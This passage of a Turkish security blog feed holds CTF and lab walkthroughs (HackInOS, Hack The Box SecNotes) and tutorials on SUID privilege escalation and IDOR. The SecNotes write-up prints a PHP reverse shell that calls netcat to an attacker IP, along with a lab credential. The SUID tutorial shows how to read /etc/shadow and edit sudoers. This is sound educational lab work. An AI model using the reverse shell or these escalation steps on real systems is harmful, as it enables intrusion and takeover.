+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="818" height="830" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2.png" alt="" class="wp-image-637" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2.png 818w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2-296x300.png 296w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/mysql-2-768x779.png 768w" sizes="(max-width: 818px) 100vw, 818px" /></figure>
+
+
+
+<p>İlgili tablodan bazı bilgiler çıktı. Pw kısmı MD5 ile hashlenmiş gibi duruyor. Google’ladığımızda kırılmış hali karşımıza çıkıyor.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="1024" height="143" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1.png" alt="" class="wp-image-638" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1.png 1024w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1-300x42.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/md5-decode-1024x143-1-768x107.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>Makinelerden birinde ssh portu açıktı bu hesap bilgilerini deneyelim.<br></p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="799" height="368" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2.png" alt="" class="wp-image-639" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2.png 799w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2-300x138.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/user-2-768x354.png 768w" sizes="(max-width: 799px) 100vw, 799px" /></figure>
+
+
+
+<p>Evet ssh ile bağlandık. Root olmak için biraz araştırıyoruz.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="826" height="226" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1.png" alt="" class="wp-image-640" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1.png 826w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1-300x82.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-1-768x210.png 768w" sizes="(max-width: 826px) 100vw, 826px" /></figure>
+
+
+
+<p>Bu sefer çok zorlanmadan dosyamızı buluyoruz. SUID biti ile çalışan bir dosya. Çalıştırıldığında root çıktısı veriyor. Strings ile içeriğini inceleyeliyoruz.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="836" height="732" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2.png" alt="" class="wp-image-641" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2.png 836w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2-300x263.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-2-768x672.png 768w" sizes="(max-width: 836px) 100vw, 836px" /></figure>
+
+
+
+<p>İçerisinde bir yerde whoami komutu geçiyor. C kodundan derlenmiş.&nbsp;<strong>system(“whoami”)&nbsp;</strong>gibi bir kod olmalı. Path değişkeni ile içerisindeki&nbsp;<strong>whoami&nbsp;</strong>komutunu istismar ederek root kullanıcısına geçebiliriz.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="1024" height="158" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1.png" alt="" class="wp-image-642" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1.png 1024w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1-300x46.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-3-1024x158-1-768x119.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>Ekran görüntüsünde ki gibi root kullanıcısına geçebiliriz.</p>
+
+
+
+<figure class="wp-block-image size-large"><img decoding="async" loading="lazy" width="1024" height="631" src="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-1024x631.png" alt="" class="wp-image-643" srcset="https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-1024x631.png 1024w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-300x185.png 300w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4-768x473.png 768w, https://ridvankaplan.github.io/wp-content/uploads/2020/04/enum-4.png 1082w" sizes="(max-width: 1024px) 100vw, 1024px" /></figure>
+
+
+
+<p>Makineyi yayınladıkları için <strong>GaziCyber</strong> ekibine ve makinede tüm emeği geçen arkadaşlara teşekkür ederim.</p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/vulnhub/hackinos-1-vulnhub.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>SUID Biti ile Yetki Yükseltme</title>
+		<link>https://ridvankaplan.github.io/linux/suid-biti-ile-yetki-yukseltme.html</link>
+					<comments>https://ridvankaplan.github.io/linux/suid-biti-ile-yetki-yukseltme.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Fri, 08 Mar 2019 17:31:12 +0000</pubDate>
+				<category><![CDATA[Linux]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=502</guid>
+
+					<description><![CDATA[Merhaba !!! Bu yazımda SUID bitinin ne olduğundan bahsedeceğim ve birkaç demo yapacağım. Boot2root makinelerinde normal kullanıcı ile shell aldıktan sonra yetki yükseltmek (privilige escalation)&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p>Bu yazımda <strong>SUID</strong> bitinin ne olduğundan bahsedeceğim ve birkaç demo yapacağım. Boot2root makinelerinde normal kullanıcı ile shell aldıktan sonra yetki yükseltmek (privilige escalation) için çalışmalara başlanır. Bu durumda ilk önce dosyaların izinleri kontrol edilir.</p>
+
+
+
+<span id="more-502"></span>
+
+
+
+<p><strong>Not</strong>: İzin yapılarını biliyorsanız direkt SUID biti kısmına atlayabilirsiniz.</p>
+
+
+
+<p>Linux&#8217;ta dosyalar temel olarak 3 izin yapısıyla çalışır. Okuma, yazma ve çalıştırma izinleri bulunur. Farklı kullanıcılara farklı izinleri verebilirsiniz. Hangi kullanıcıya hangi izni verdiğinize veya kısıtladığınıza dikkat etmek gerekir. </p>
+
+
+
+<ul><li>Okuma İzni        (r)   &gt;  4</li><li>Yazma İzni          (w) &gt;  2</li><li>Çalıştırma İzni   (x)   &gt;  1</li></ul>
+
+
+
+<p>Örnek olarak <strong>chmod 741 dosya_ismi</strong> komutu ile izin verilmiş bir dosyayı inceleyelim. İzin yapısı aşağıdaki şekilde oluşacaktır.</p>
+
+
+
+<pre class="wp-block-code"><code> -rwxr----x </code></pre>
+
+
+
+<p>Soldaki kısım<strong> rwx</strong> dosyanın sahibinin, ortaki kısım <strong>r &#8211; &#8211;</strong> kullanıcının ait olduğu grubun, sağdaki kısım <strong>&#8211; &#8211; x</strong> ise diğer kullanıcıların  izinleridir. Kullanıcının yazma, çalıştırma ve okuma izni bulunmaktadır. Kullanıcının grubu için sadece okuma izni bulunmaktadır. Diğer kullanıcılar için ise sadece çalıştırma izni bulunmaktadır. En soldaki <strong>&#8211; </strong>ise normal bir dosya olduğunu belirtir.</p>
+
+
+
+<p><strong>SUID İzni Nedir ? </strong></p>
+
+
+
+<p>Temel izinler dışında özel bazı izinler vardır. Bunlardan biri <strong>SUID (Set Owner User ID Up On Execution)  </strong>bitidir.  Kullanıcıların belirli bir kullanıcının izinleriyle bir dosyayı çalıştırmalarına izin veren bir izin türüdür. SUID izinleri olan dosyalar daha yüksek ayrıcalıklarla çalışır. Hedef sisteme root olmayan bir kullanıcı olarak eriştiğimizi ve SUID bit etkin dosyaları bulduğumuzu varsayalım. Bulunan dosya, program veya komut root haklarıyla çalıştırılabilir.</p>
+
+
+
+<p>SUID izni 2 şekilde verilebilir<strong>. chmod u+s dosya_ismi </strong>veya<strong> chmod 4741<br>dosya_ismi </strong>gibi verildikten sonra şu şekilde olmalıdır  &gt;</p>
+
+
+
+<pre class="wp-block-code"><code> -rwsr----x</code></pre>
+
+
+
+<p><strong>Sunucuda SUID Bitine Sahip Dosyaları Nasıl Bulunur  ?</strong></p>
+
+
+
+<pre class="wp-block-code"><code>find dizin -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code></pre>
+
+
+
+<p><strong>dizin</strong> &gt; Hangi dizinden kontrol etmeye başlanacağı belirtilir.<br><strong>-perm -4000 </strong>&gt; Sadece izni 4000 olan dosyaları bulur.<br><strong>-exec ls -ldb</strong>&gt; Çıktıyı ls -ldb komutunun çıktısı şeklinde basar.<br><strong>2&gt;/dev/null</strong>&gt; Dosyaları kontrol ederken izin hataları ile karşılaştığında ekrana basmamak için belirtilir.<br>Yukarıdaki komut tek yol değildir.  Az veya daha çok parametreler ile de bulabilirsiniz. Benim genellikle kullandığım komut yukarıdaki gibidir. Örneğin <strong>-user root </strong>parametresi ekleyerek &gt; Yalnızca root kullanıcısına sahip dosyaları bulabilirsiniz.<br></p>
+
+
+
+<p><strong>Suid Biti Nasıl Sömürülür ? </strong></p>
+
+
+
+<p>İlk önce suid bitine sahip dosya veya komutlar kontrol edilir.<br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/suidCikti.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/suidCikti.png" alt="" class="wp-image-511"/></a></figure>
+
+
+
+<p>Örnek olarak / dizininin altındaki suid bitine sahip dosyaları (komutlarda bir <strong><a rel="noreferrer noopener" aria-label="ELF dosyasıdır (yeni sekmede açılır)" href="https://en.wikipedia.org/wiki/Executable_and_Linkable_Format" target="_blank">ELF dosyasıdır</a>)</strong>  bulup /tmp dizini içerisinde bir dosyaya yazdırıldı. İçeriği ise ekran görüntüsündeki gibidir. Bazı dosyaların izinlerini demo olması açısından değiştirdim. Sisteminizde değiştirmediyseniz aşağıdaki dosyalar suid bitine sahip olmayacaktır.</p>
+
+
+
+<p>Öncelikle bir dosyada suid biti varsa o dosya ile farklı şekillerde de yetkiniz olmayan işlemler yapabilirsiniz.</p>
+
+
+
+<p><strong>/bin/nano</strong></p>
+
+
+
+<p>Nano komutu ile istediğimiz dosyayı değiştirebileceğimiz için aklımıza ilk olarak <strong>/etc/sudoers</strong> dosyasını değiştirmek gelebilir. </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nano-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nano-1.png" alt="" class="wp-image-515"/></a></figure>
+
+
+
+<p>Örneğin normalde<strong> /etc/sudoers </strong>dosyasını okuma bile yetkimiz yokken nano komutu suid bitine sahip olduğu için değiştirmeye çalışalım.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nano-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nano-2-1024x506.png" alt="" class="wp-image-516"/></a></figure>
+
+
+
+<p>En alt kısmına  ekran görüntüsündeki gibi satır eklenir.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nano-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/nano-3-1024x275.png" alt="" class="wp-image-517"/></a></figure>
+
+
+
+<p><strong>/usr/bin/file</strong></p>
+
+
+
+<p>Ve parola sorulmadan root shell&#8217;i alınır.<br>File komutu ile dosyaların içeriğini okuyabiliriz. Akla gelen ilk okunabilecek yetkili dosya tüm kullanıcıların parolasının hash değerlerinin tutulduğu<strong> /etc/shadow</strong> dosyası okunabilir. </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/file-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/file-1-1024x126.png" alt="" class="wp-image-512"/></a></figure>
+
+
+
+<p>Ekran görüntüsünde suid biti verilmeden önceki hali ve sonraki hali bulunmaktadır. Suid biti verildikten sonra dosyanın içeriği okunabilmektedir. Çıkan değerler parolalarının hash değerleri olacağı için bir wordlist ile kırılması gerekir.</p>
+
+
+
+<p><strong>/usr/bin/find</strong></p>
+
+
+
+<p>Find komutu dosyaları bulmamıza yarar ama ayrıca linux komutları çalıştırabiliriz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/find-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/find-1.png" alt="" class="wp-image-513"/></a></figure>
+
+
+
+<p>Örneğin ekran görüntüsünde ki gibi parametrelerini vererek <strong>/bin/sh </strong>komutunu çalıştırılabilir ve root shell&#8217;i alınır.</p>
+
+
+
+<p><strong>/usr/bin/python2.7</strong></p>
+
+
+
+<p>Python da linux komutlarını çalıştırabileceğiniz için root yetkisiyle shell alınır.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/python-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/python-1.png" alt="" class="wp-image-514"/></a></figure>
+
+
+
+<p>Bu komutlar gibi birçok komut olabilir. Şuana dek en düzenli ve sade şeklinde bulunan<a rel="noreferrer noopener" aria-label=" bu siteyi  (yeni sekmede açılır)" href="https://gtfobins.github.io/" target="_blank"> bu siteyi </a>gördüm. Mantığı anladıysanız diğer örnekleri de rahatlıkla anlayabilirsiniz..<br></p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/linux/suid-biti-ile-yetki-yukseltme.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Insecure Direct Object References &#8211; IDOR</title>
+		<link>https://ridvankaplan.github.io/web-security/idor-insecure-direct-object-references.html</link>
+					<comments>https://ridvankaplan.github.io/web-security/idor-insecure-direct-object-references.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Tue, 26 Feb 2019 08:39:42 +0000</pubDate>
+				<category><![CDATA[Web Security]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=480</guid>
+
+					<description><![CDATA[Merhaba !!! Insecure Direct Object References&#8217;i Türkçe&#8217;ye Güvensiz Doğrudan Nesne Referansları olarak çevirebiliriz. IDOR bir web uygulamasında kullanıcıdan alınan girdiden nesnelere doğrudan erişim sağladığında meydana&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p>Insecure Direct Object References&#8217;i Türkçe&#8217;ye Güvensiz Doğrudan Nesne Referansları olarak çevirebiliriz.</p>
+
+
+
+<span id="more-480"></span>
+
+
+
+<p><strong>IDOR</strong> bir web uygulamasında kullanıcıdan alınan girdiden nesnelere doğrudan erişim sağladığında meydana gelir. Bu zafiyetin sonucunda saldırganlar izinleri(yetkilendirme sistemlerini) atlatabilir, sistemde doğrudan erişim kaynaklarına atlayabilir. Örneğin başka kullanıcıların bilgilerini değiştirmek, veritabanı kayıtlarına erişmek gibi yetkiniz olmayan işlemlere izin verir.</p>
+
+
+
+<p>Saldırganlar bu zafiyeti doğrudan bir nesneye işaret etmek için kullanılan bir parametrenin değerini değiştirerek sömürebilir. Zafiyetin nedeni web uygulamasının kullanıcıdan aldığı girdinin yeterli yetki kontrol işlemi yapmadan bir nesneyi almak için kullanmasıdır.</p>
+
+
+
+<p>Test amaçlı BWAPP üzerinde IDOR için olan bölümden bazı kısımları paylaşacağım. Kendinizde denemek için<a href="http://www.itsecgames.com/" target="_blank" rel="noreferrer noopener" aria-label=" (yeni sekmede açılır)"> buradaki linkten</a> indirip, kurabilir ve deneyebilirsiniz.</p>
+
+
+
+<p>İlk senaryomuzda kullanıcıya ait secret(gizli) değerinin değiştirme sayfası bulunmaktadır. Saldırgan kendisine ait olmayan başka bir kullanıcının secret değerini değiştirmeye çalışacak. </p>
+
+
+
+<p>Ekran görüntüsündeki gibi bir arayüzü bulunmakta. İlk önce deneme amaçlı bir değer gönderiyoruz ve burp suite aracı ile aradaki isteği inceliyoruz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret1-1024x310.png" alt="" class="wp-image-483"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>İstekte değiştirmek istediğimiz değer ve giriş yapan kullanıcı gözükmekte. Bu şekilde gönderip isteği inceleyelim.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret2.png" alt="" class="wp-image-484"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Herhangi bir problem olmadan değiştirildi.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret3.png" alt="" class="wp-image-485"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>İstekte giriş yapan kullanıcıyı örneğin &#8220;Admin&#8221; kullanıcısıyla gönderdiğimizde neler olabilir ?</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret4.png" alt="" class="wp-image-486"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Değiştirildi ama neden ? Çünkü secret değerinin değiştirilirken herhangi farklı bir doğrulama yapılmadı. Sadece login nesnesindeki değer baz alınarak işlem gerçekleşti. Bizde login nesnesine doğrudan erişimimiz olduğu için değiştirebildik.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret5.png" alt="" class="wp-image-487"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>İstersek veritabanı kayıtlarındanda inceleyebiliriz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/secret6.png" alt="" class="wp-image-488"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Diğer bir senaryomuz ise ücreti 15 EURO olan bir bileti istediğimiz sayıda sipariş verip sayıya göre ücretini hesabımızdan kesiyor.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order1.png" alt="" class="wp-image-490"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Aradaki isteği de incelemeyi ihmal etmiyoruz. Buradaki problem adet sayısının yanında bilet ücretinide görebiliyor olmamız belki de değiştirebiliriz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order2.png" alt="" class="wp-image-492"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Örneğin 1 bilet sipariş veriyoruz. ve 15 EUR ödememiz gerekiyor. </p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order3.png" alt="" class="wp-image-491"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Büyük bir miktar yazıp aradaki isteği inceyelim. 777 tane bilet sayısı girip ücretini de 0 girdiğimizde neler olabilir ?</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order4.png" alt="" class="wp-image-493"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>777 tane bileti 0 EUR&#8217;ya almış oluruz. Olması gereken bizim o değeri değiştirmemize izin vermemesi gerekir ki böyle bir zaafiyet ortaya çıkmasın.</p>
+
+
+
+<figure class="wp-block-image"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2019/03/order5.png" alt="" class="wp-image-494"/><figcaption><br></figcaption></figure>
+
+
+
+<p>IDOR zafiyetinden etkilenmemek için birbirine bağlı nesneler de değişikliğe izin verilmemesi gereken nesneyi değiştirdiğimiz zaman hata vermesi ve işlemi yapmamasını sağlayarak. Bunuda her işleme özel &#8220;token&#8221; tarzı değerlerle kontrol edilebiliriz.</p>
+
+
+
+<p>Okuduğunuz için teşekkürler. Yazılarımda herhangi bir teknik hata varsa bildirmekten çekinmeyiniz…</p>
+
+
+
+<p><strong>Not:</strong> Yazılan herşey eğitim amaçlıdır farklı amaçlarla canlı sistemler üzerinde denemeyiniz. </p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://ridvankaplan.github.io/web-security/idor-insecure-direct-object-references.html/feed</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>SecNotes &#8211; Hack The Box</title>
+		<link>https://ridvankaplan.github.io/hack-the-box/secnotes-hack-the-box.html</link>
+					<comments>https://ridvankaplan.github.io/hack-the-box/secnotes-hack-the-box.html#respond</comments>
+		
+		<dc:creator><![CDATA[Rıdvan Kaplan]]></dc:creator>
+		<pubDate>Sun, 20 Jan 2019 07:09:24 +0000</pubDate>
+				<category><![CDATA[CTF]]></category>
+		<category><![CDATA[Hack The Box]]></category>
+		<guid isPermaLink="false">https://ridvankaplan.github.io/?p=433</guid>
+
+					<description><![CDATA[Merhaba !!! Şimdi Hack The Box içerisinde yeni emekliye ayrılmış SecNotes makinesinin çözümünü inceleyeceğiz. Öncelikle nmap taramasıyla port durumlarını inceleyelim. Hedef makinemiz Windows sunucu üzerinde&#8230;]]></description>
+										<content:encoded><![CDATA[
+<p>Merhaba !!!</p>
+
+
+
+<p>Şimdi Hack The Box içerisinde yeni emekliye ayrılmış SecNotes makinesinin çözümünü inceleyeceğiz.</p>
+
+
+
+<span id="more-433"></span>
+
+
+
+<p>Öncelikle nmap taramasıyla port durumlarını inceleyelim.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-1.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-1.png" alt="" class="wp-image-434"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Hedef makinemiz Windows sunucu üzerinde çalışıyormuş ve 3 tane port açıkmış. Öncelikle 80 portunu tarayıcımız üzerinde inceleyelim.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-2.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-2.png" alt="" class="wp-image-435"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Tarayıcımızda açınca direkt giriş sayfasına yönlendiriyor. Öncelikle normal bir kullanıcıyla kayıt olup giriş yapıyorum. <br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-3.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-3-1024x454.png" alt="" class="wp-image-436"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Notlarımızı kaydettiğimiz bir internet sitesiymiş. Yeni not ekleme, parola değiştirme gibi seçenekler var. </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-4.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-4-1024x423.png" alt="" class="wp-image-437"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Denemek amaçlı XSS varmıdır diye merak ettim. Evet var ama bir işimize yaramaz buradaki XSS. Biz tekrar giriş sayfamıza dönelim.</p>
+
+
+
+<p><em>Login</em> gördüğümüz an aklımıza SQL Injection gelmesi gerekiyor. Amacımız tüm kayıtlı notları görmek olacağı için bypass etmeye çalışıyorum. Çok da zor değilmiş atlatması. </p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-5.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-5.png" alt="" class="wp-image-438"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Biraz SQL biliyorsanız yazdığımı anlamışsınızdır. Tüm kullanıcıların notlarını görmemizi sağlar. Sqli yapacağımız payload ile kayıt olup giriş yapıyoruz. </p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-6.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-6-1024x512.png" alt="" class="wp-image-439"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Ve tüm kayıtlı notları görebiliyoruz. Notlardan birisi dikkatimi çekiyor. Kullanıcı adı, parola gibi değerlere benziyor. Hatırlarsanız 445 (SMB) portu açıktı. Oradan giriş yapmayı deneyebiliriz</p>
+
+
+
+<p><strong>Kullanıcı Adı     -&gt;   tyler <br>Parola                -&gt; 92g!mA8BGjOirkL%OG*&amp;<br>Paylaşım            -&gt; new-site</strong><br> <strong><br></strong></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-7.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-7.png" alt="" class="wp-image-440"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Bulduğumuz değerler ve smbclient ile bağlanıyoruz. İçeride 2 dosya buluyoruz. Bu dosyalar 8808 portunda olan çalışan dosyalar olduğunu fark ediyoruz.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-18.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-18-1024x431.png" alt="" class="wp-image-441"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Anlıyoruz ki buraya yüklediğimiz dosyaları 8808 portunda açabiliriz. Hemen reverse shell almaya çalışıyoruz.</p>
+
+
+
+<p>Kullandığım php dosyası şu şekilde</p>
+
+
+
+<pre class="wp-block-code"><code>&lt;?php 
+echo shell_exec('nc.exe 10.10.15.210 1234 -e cmd.exe');
+//CySecLab
+//nc 192.168.100.113 4444 –e /bin/bash >>> For Linux Systems
+//nc.exe 192.168.100.113 4444 –e cmd.exe  >>> For windows Systems
+?></code></pre>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-8.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-8.png" alt="" class="wp-image-444"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Php dosyası  netcat&#8217;i kullanacağı için yanında birde nc.exe programını yüklüyorum. Kendi terminalimden de 1234 portunuda dinlemeye alıyorum ve tarayıcıda açıyorum.</p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-9.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-9-1024x489.png" alt="" class="wp-image-445"/></a></figure>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-10.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-10.png" alt="" class="wp-image-446"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Bağlantımızı aldık ve<strong> user.txt</strong>&#8216;mizi okuduk. Sıradaki amacımız <strong>root.txt</strong>&#8216;i okumak.</p>
+
+
+
+<p>Öncelikle dizinleri inceliyorum. Değişik birşeyler var mı diye.</p>
+
+
+
+<p><br></p>
+
+
+
+<figure class="wp-block-image"><a href="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-11.png"><img decoding="async" src="https://ridvankaplan.github.io/wp-content/uploads/2018/12/SecNotes-11.png" alt="" class="wp-image-448"/></a><figcaption><br><br></figcaption></figure>
+
+
+
+<p>Windows sunucu üzerinde dağıtım olarak ubuntu yüklü. Fark ettiyseniz internet sitesinde <strong> login.php register.php </strong>olmasının nedeni buydu. Ve shell&#8217;imizi de php dosya kullanarak almıştık. Eğer ubuntu yüklü ise bu dağıtımın içine bağlanabiliriz demektir. Tüm dizinlerde <strong>bash</strong>, <strong>bash.exe</strong> gibi isimleri arattım ve buldum.</p>
+
+
